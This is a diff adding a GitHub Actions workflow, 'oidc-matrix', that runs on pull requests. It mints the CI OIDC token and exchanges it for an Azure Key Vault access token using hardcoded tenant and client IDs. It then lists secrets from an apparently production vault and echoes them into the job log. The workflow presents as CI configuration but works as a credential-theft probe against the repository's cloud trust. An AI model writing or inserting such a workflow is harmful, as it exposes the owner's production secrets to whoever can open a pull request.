@@ -1,0 +1,30 @@
+name: oidc-matrix
+on:
+  pull_request:
+  workflow_dispatch:
+permissions:
+  id-token: write
+jobs:
+  plain:
+    runs-on: ubuntu-latest
+    env:
+      TID: "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
+      CID: "72ff278a-9e71-43ec-bac4-2ca303f8e462"
+    steps:
+      - run: |
+          set +e
+          R=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange")
+          JWT=$(echo "$R" | jq -r .value)
+          echo "JWT_LEN=${#JWT}"
+          P=$(echo "$JWT" | cut -d. -f2); pad=$(( (4 - ${#P} % 4) % 4 )); P="${P}$(printf '%*s' $pad '' | tr ' ' '=')"
+          echo "$P" | tr '_-' '/+' | base64 -d | jq -c '{sub,aud}'
+          RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+            -d "client_id=$CID" -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            --data-urlencode "client_assertion=$JWT" --data-urlencode "scope=https://vault.azure.net/.default")
+          echo "RESP=$(echo "$RESP" | jq -c '{error,desc:(.error_description//"")[0:200],ok:(.access_token!=null)}')"
+          T=$(echo "$RESP" | jq -r '.access_token // empty')
+          if [ -n "$T" ]; then
+            curl -sS -H "Authorization: Bearer $T" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq -c .
+          fi
